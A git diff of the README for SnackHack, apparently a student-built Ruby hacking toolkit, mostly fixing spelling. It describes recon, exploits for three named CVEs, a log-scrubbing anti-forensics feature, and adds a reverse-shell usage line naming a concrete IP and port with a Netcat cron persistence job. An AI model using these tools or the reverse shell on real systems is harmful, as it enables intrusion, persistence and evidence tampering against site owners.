@@ -6,16 +6,16 @@
 
 ### What is SnackHack?
 
-A collection of scripts that could be used to aid in hacking or performing recon on a taraget. The idea of this project is to take techniques learned in college to get experience and a better understanding of the techniques used to perform recon & hacking. 
-Originally this idea was apart of my senior project but I had to ditch the idea. 
+A collection of scripts that could be used to aid in hacking or performing recon on a target. The idea of this project is to take techniques learned in college to get experience and a better understanding of the techniques used to perform recon & hacking. 
+Originally this idea was a part of my senior project but I had to ditch the idea. 
 
 ## Banner Grabbing.
 
-Banner grabbing is used to get information about a server or computer. This information could help the hacker determine if the server or service is vulnerable. This information could also be used to figure out how to best enumerate a service. 
+Banner grabbing is used to get information about a server or computer. This information could help the hacker determine if the server or service is vulnerable. This information could also be used to figure out the best way to enumerate a service. 
 
 ## Extracting Emails & Phone Numbers.
 
-Scraping Emails or phone numbers from a site could be used to attemp to Social Engineer a user from that site via email, phone or SMS. Not all phishing emails or texts contain miss spellings or improper grammar. Some common techniques used when writting phishing emails or messages include the following:
+Scraping Emails or phone numbers from a site could be used to attempt to Social Engineer a user from that site via email, phone, or SMS. Not all phishing emails or texts contain misspellings or improper grammar. Some common techniques used when writing phishing emails or messages include the following:
 
 - Intimidation
 - Scarcity
@@ -29,32 +29,32 @@ These techniques work to manipulate the user to give information or perform a ce
 
 ## Robots.txt & Sitemap.xml.
 
-The Robots.txt file is used to by sites to tell web crawlers such as Google what paths to crawl and what paths to ignore. Not every crawler will honor the robots.txt file. The site's robots.txt file will include paths that they do not want to be crawled, we can use this information to possibly access paths will disclose sensitive information. It could also lead hackers to areas of the site that are not supposed to be viewed by unauthorized users. The sitemap.xml includes a list of URLs of a site. This helps Google and other search engines to be able to crawl links on a site. It is supposed to help with search ranking. 
+The Robots.txt file is used by sites to tell web crawlers such as Google what paths to crawl and what paths to ignore. Not every crawler will honor the robots.txt file. The site's robots.txt file will include paths that they do not want to be crawled, we can use this information to possibly access paths that will disclose sensitive information. It could also lead hackers to areas of the site that are not supposed to be viewed by unauthorized users. The sitemap.xml includes a list of URLs of a site. This helps Google and other search engines to be able to crawl links on a site. It is supposed to help with search ranking. 
 
-When a site displays a cryptocurrency address on the site, the address could be used to discover more sites that are owned by site or even their financial situation due to the fact that some cryptocurrencies block chain are public. Cryptocurrencies like Bitcoin, DogeCoin and Litecoin block chains are public, meaning you can see the amount of coins owned by the address. Cryptocurrencies that have a public blockchain have blockchain explorers that can be used to see how much an address has. It can also be used to view the past transcations. 
+When a site displays a cryptocurrency address on the site, the address could be used to discover more sites that are owned by the site or even their financial situation because some cryptocurrency's blockchains are public. Cryptocurrencies like Bitcoin, DogeCoin, and Litecoin blockchains are public, meaning you can see the amount of coins owned by the address. Cryptocurrencies that have a public blockchain have blockchain explorers that can be used to see how much an address has. It can also be used to view past transactions. 
 
-Not all cryptocurrencies are public, cryptocurrenies like Monero have a private blockchain meaning that you CAN'T see how much a certain address has. 
+Not all cryptocurrencies are public, cryptocurrencies like Monero have a private blockchain meaning that you CAN'T see how much a certain address has. 
 
 ## Website MetaData & Google Analytics.
 
-Websites use the HTML meta tag to include information about the site that supposed to help in being ranked higher on a search engine. This information could also be used to figure out what software or even the software version. Finding the Google Analytics tag could aid a hacker to locate different sites that are probably owned by the same owner. 
+Websites use the HTML meta tag to include information about the site that is supposed to help in being ranked higher on a search engine. This information could also be used to figure out what software or even the software version. Finding the Google Analytics tag could aid a hacker in locating different sites that are probably owned by the same owner. 
 
 ## Port Scanning. 
 
-Scanning the first thousand ports of a server or computer will help reveal the purposes of the server and might give the hacker a way into the computers internal network. If the server shows that port 22 is open, the hacker might be able to brute force the SSH server or figue out the version of the service and exploit a vulnerability. This feature will only scan TCP ports. Future versions might include a UDP ports.
+Scanning the first thousand ports of a server or computer will help reveal the purposes of the server and might give the hacker a way into the computer's internal network. If the server shows that port 22 is open, the hacker might be able to brute force the SSH server or figure out the version of the service and exploit a vulnerability. This feature will only scan TCP ports. Future versions might include UDP ports.
 
 ## Enumerating Web Content Management Platforms.
 
-Figuring out what plugins or the version of the Web content management platforms can aid the hacker in compromising the site. The information could also be used to gather information about the site owners such as the usernames which could be used to brute forced the login for a certain user. The disclosure of the version and other information could also be used by a hacker to attemp to exploit a vulnerablity. Information like the MySQL version could be used to get into the site's database where they might be able to dump the database and use the dump to login into the site which could give them complete control of the server. 
+Figuring out what plugins or versions of the Web content management platforms can aid the hacker in compromising the site. The information could also be used to gather information about the site owners such as the usernames which could be used to brute force the login for a certain user. The disclosure of the version and other information could also be used by a hacker to attempt to exploit a vulnerability. Information like the MySQL version could be used to get into the site's database where they might be able to dump the database and login as the administrator of the site or use it to hack other users of the site.  
 
 ## Exploits.
 
-Exploits can be used to gain unauthorized access to a server or computer. Currently Snackhack2 has an exploits for CVE-2023-3710, 
-CVE-2018-11709 and CVE-2015-6522. `CVE-2018-11709` is a XSS exploit. While CVE-2023-3710 exploits a Command Injection vulnerabilities in printer web page. This could allow hackers access to the network. `CVE-2015-6522` allows remote attackers to execute arbitrary SQL commands in the WordPress plugin, wp-symposium.
+Exploits can be used to gain unauthorized access to a server or computer. Currently, Snackhack2 has exploits for CVE-2023-3710, 
+CVE-2018-11709 and CVE-2015-6522. `CVE-2018-11709` is an XSS exploit. At the same time, CVE-2023-3710 exploits a command injection vulnerability on a printer web page. This could allow hackers access to the network. `CVE-2015-6522` allows remote attackers to execute arbitrary SQL commands in the WordPress plugin, wp-symposium.
 
 ## Post Exploitation.
 
-After exploiting a vulnerability and gaining access to server, a hacker might want to hide their tracks. As of right of now there is only one post exploitaton feature in Snackhack. This feature will take a web server log and remove a certain IP and replace it with a randomly generated IP. This could be used to cover your tracks or as a anti forsenic method. 
+After exploiting a vulnerability and gaining access to the server, a hacker might want to hide their tracks. As of right now, there is only one post-exploitation feature in Snackhack. This feature will take the web server logs, remove a certain IP, and replace it with a randomly generated IP. This could be used to cover your tracks or as an anti-forensic method. 
 
 ## Installation
 
@@ -147,6 +147,13 @@ wp.wp_content_uploads
     puts "\n"
 end
 ```
+## Reverse Shell
+Will print out the command to run and will set a cron job that will run every minute that will use Netcat to connect to the server. 
+
+```ruby
+Snackhack2::ReverseShell.new("167.71.98.144", "99").run
+```
+
 ## Links
 
 Grab all the links in a site and save it in a file named `google.com_links.txt` By default `@save_file` is set as `true`. If set to false it will print out all the links.
